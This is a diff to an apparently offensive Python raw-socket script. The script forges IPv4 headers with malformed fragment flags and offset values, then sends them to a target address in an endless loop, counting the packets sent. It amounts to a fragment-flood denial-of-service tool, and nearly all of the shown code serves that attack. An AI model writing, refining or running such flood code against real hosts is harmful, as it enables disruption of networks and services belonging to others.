@@ -38,7 +38,8 @@ def mk_header(src_ip, dst_ip):
     ident = 12345
     # Flags | Offset
     # > Sets the "more fragments" bit
-    frag_off = 1 << 13
+    # > And displays this as the very last fragment
+    frag_off = int('0b0011111111111111', base=2)
     ttl = 255
     proto = socket.IPPROTO_TCP
     # Handled by OS
@@ -47,7 +48,7 @@ def mk_header(src_ip, dst_ip):
     dst = socket.inet_aton(dst_ip)
 
     # Make this a byte
-    ihl_ver = (ver << 4) + ihl
+    ihl_ver = (ver << 4) | ihl
 
     return struct.pack(
         '!BBHHHBBH4s4s',
@@ -60,11 +61,14 @@ def main():
     src = '10.0.0.211'
     header = mk_header(src, target)
     sock = mk_sock()
+    counter = 0
     try:
         while True:
             sock.sendto(header, (target, 0))
+            counter += 1
     except KeyboardInterrupt:
-        ...
+        print(f"Sent {counter} packets to {target}!")
+        sys.exit(0)
 
 
 if __name__ == '__main__':
